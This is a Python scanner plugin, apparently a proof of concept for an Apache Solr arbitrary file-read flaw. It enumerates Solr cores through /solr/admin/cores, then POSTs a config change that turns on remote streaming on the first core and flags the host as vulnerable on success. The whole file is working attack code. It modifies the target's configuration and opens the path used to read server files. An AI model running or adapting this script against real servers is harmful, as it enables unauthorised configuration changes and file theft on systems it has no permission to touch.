#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Apache Solr任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/solr/admin/cores?indexInfo=false&wt=json'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "status" in res.text:
      res_json = res.json()
      res.close()
      core_name=(list(res_json.get('status'))[0])
      url2 = url+'/solr/'+core_name+'/config'
      headers['Content-type'] = "application/json"
      data='{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
      resp = requests.post(url=url2,headers=headers,data=data,timeout=15,verify=False)
      if resp.status_code == 200 and "experimental" in resp.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        resp.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret